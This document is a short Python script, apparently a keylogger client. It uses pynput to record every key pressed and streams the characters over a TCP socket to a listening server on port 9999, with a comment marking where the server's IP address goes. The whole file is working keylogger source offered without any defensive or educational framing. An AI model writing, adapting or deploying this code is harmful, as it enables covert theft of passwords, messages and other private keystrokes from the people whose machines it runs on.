import socket
import threading
from pynput.keyboard import Key,Listener

def key_logger(s):
    def on_press(key):
        try:
            s.send(key.char.encode('utf-8'))
        except AttributeError:
            if (key == Key.space):
                s.send(' '.encode('utf-8'))
            elif (key == Key.ctrl_l):
                s.send('ctrl-l'.encode('utf-8'))
            else:
                pass

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


s=socket.socket()
host=socket.gethostname() #server's IP
s.connect((host,9999))
t=threading.Thread(target=key_logger,args=(s,))
t.start()
t.join()
s.close()
